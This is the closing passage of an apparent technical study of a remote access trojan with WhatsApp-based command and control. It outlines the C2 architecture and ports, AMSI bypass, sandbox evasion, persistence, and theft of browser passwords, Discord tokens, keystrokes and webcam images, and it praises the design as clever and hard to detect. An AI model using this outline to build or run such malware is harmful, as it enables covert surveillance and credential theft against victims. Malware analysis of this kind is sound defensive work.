│  │ RAT Client   │  │ RAT Client   │  │ RAT Client   │  │
│  │ (Connected)  │  │ (Connected)  │  │ (Connected)  │  │
│  └──────────────┘  └──────────────┘  └──────────────┘  │
│         │                │                   │          │
│         └────────────────┴───────────────────┘          │
│                         │                               │
│               Connect to C2 (Port 4444)                 │
└─────────────────────────────────────────────────────────┘
```

### 11.2 Port Configuration

| Component | Port | Protocol | Purpose |
|-----------|------|----------|---------|
| C2 Server | 4444 | Raw TCP Socket | RAT communication |
| API Bridge | 5000 | HTTP REST | Bot integration |
| WhatsApp | — | WebSocket | Message protocol |

---

## 12. Security Considerations

### 12.1 Evasion Techniques

1. **AMSI Bypass**
   - Memory patching of AmsiScanBuffer
   - Disables antivirus scanning

2. **Sandbox Detection**
   - CPU count check
   - RAM size check
   - Disk space check
   - VM string detection

3. **Privilege Escalation**
   - UAC bypass attempts
   - Token impersonation
   - Exploit chaining (attempted)

4. **Persistence**
   - Registry Run keys
   - Scheduled tasks
   - Startup folder injection

### 12.2 Data Exfiltration

1. **Credential Harvesting**
   - Browser password extraction (DPAPI decryption)
   - WiFi credential scraping
   - Discord token theft
   - Browser history logging

2. **Surveillance**
   - Desktop screenshots
   - Webcam capture
   - Keystroke logging
   - Audio recording
   - Clipboard monitoring

3. **System Reconnaissance**
   - OS/hardware enumeration
   - Process listing
   - Software inventory
   - Network scanning
   - Geolocation

---

## 13. Conclusion

This is a **sophisticated RAT framework** with:
- ✅ Multiple control interfaces (Terminal, WhatsApp, API)
- ✅ Comprehensive surveillance capabilities
- ✅ Effective credential harvesting
- ✅ Robust persistence mechanisms
- ✅ Layered encryption and security
- ✅ Modular, extensible architecture
- ✅ Professional-grade error handling

The **WhatsApp bot integration** is particularly clever, allowing command & control through an encrypted, user-friendly interface that's difficult to detect without specific network forensics.

### Key Takeaways

1. **Architecture Pattern:** Three-tier (Payload → C2 → Interface)
2. **Communication:** Socket-based with Base64/Fernet encryption
3. **Scalability:** Thread-per-session model supports many concurrent targets
4. **Interface:** WhatsApp bot provides deniable, convenient control
5. **Functionality:** Covers surveillance, credentials, system control, persistence

---

**End of Study**
